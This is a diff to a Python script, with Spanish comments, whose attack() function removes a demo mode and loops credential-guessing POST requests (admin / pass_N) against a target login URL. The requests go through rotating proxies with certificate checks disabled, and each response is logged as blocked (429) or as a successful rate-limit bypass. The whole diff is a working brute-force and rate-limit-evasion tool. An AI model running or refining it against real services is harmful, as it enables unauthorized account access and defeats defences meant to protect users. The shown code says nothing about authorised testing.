@@ -57,51 +57,51 @@ def attack():
         "https": get_proxy_url()
     }
 
-    # Demo Mode
-    DEMO_MODE = os.getenv("DEMO_MODE", "false").lower() == "true"
-    
-    if DEMO_MODE:
-        print("[*] MODO DEMO ACTIVADO: Target cambiado a http://lumtest.com/myip.json")
+    # Ataque Loop
 
     # Ataque
-    for i in range(1, 10): 
+    for i in range(1, 20): 
         try:
-            # PlainProxies suele rotar automáticamente en cada petición si se usa el puerto de rotación.
-            # No necesitamos inyectar session-id en el username a menos que lo especifique el proveedor.
+            print(f"\n[{i}] ------------------------------------------------")
             
-            if DEMO_MODE:
-                print(f"[{i}] Verificando IP...")
-                r = requests.get("http://lumtest.com/myip.json", proxies=proxies, verify=False, timeout=15)
-                try:
-                    ip_info = r.json()
-                    ip = ip_info.get('ip')
-                    country = ip_info.get('country')
-                    asn = ip_info.get('asn', {}).get('org_name', 'Unknown ASN')
-                    print(f"   🔄 IP: {ip} | 🌍 {country} | 🏢 {asn}")
-                except:
-                    print(f"   📄 Resp: {r.text.strip()}")
-                
-                print("   ⏳ Esperando 5s...")
-                time.sleep(5)
+            # 1. Obtener Info de la IP (WHOIS Simulado via lumtest)
+            try:
+                print(f"   🔎 Checkeando IP del Proxy...")
+                r_ip = requests.get("http://lumtest.com/myip.json", proxies=proxies, verify=False, timeout=10)
+                ip_info = r_ip.json()
+                ip = ip_info.get('ip')
+                country = ip_info.get('country')
+                asn = ip_info.get('asn', {}).get('org_name', 'Unknown ASN')
+                print(f"   🌍 IP: {ip} | País: {country} | ASN: {asn}")
+            except Exception as e:
+                print(f"   ⚠️ No se pudo obtener info WHOIS: {e}")
+
+            # 2. Credenciales
+            username = "admin"
+            password = f"pass_{i}"
+            print(f"   🔑 Intentando con: {username} / {password}")
+
+            # 3. Ataque
+            payload = {
+                "username": username,
+                "password": password
+            }
+            
+            start = time.time()
+            r = requests.post(TARGET_URL, json=payload, proxies=proxies, verify=False, timeout=15)
+            latency = time.time() - start
+            
+            if r.status_code == 429:
+                print(f"   ⛔ Bloqueado (429). Rate Limit detectado.")
+            elif r.status_code == 401:
+                print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
             else:
-                # Normal Attack Mode
-                payload = {
-                    "username": "admin",
-                    "password": f"pass_{i}" 
-                }
-                
-                print(f"[{i}] Enviando petición...")
-                start = time.time()
-                r = requests.post(TARGET_URL, json=payload, proxies=proxies, verify=False, timeout=15)
-                latency = time.time() - start
-                
-                if r.status_code == 429:
-                    print(f"   ⛔ Bloqueado (429). IP repetida o rate limit.")
-                elif r.status_code == 401:
-                    print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
-                else:
-                    print(f"   ❓ Status: {r.status_code}")
-                    print(f"      Body: {r.text[:200]}...") 
+                print(f"   ❓ Status: {r.status_code}")
+                # print(f"      Body: {r.text[:200]}...") 
+
+            # 4. Pausa
+            print("   ⏳ Esperando 10s...")
+            time.sleep(10)
 
         except Exception as e:
             print(f"   [!] Error: {e}")
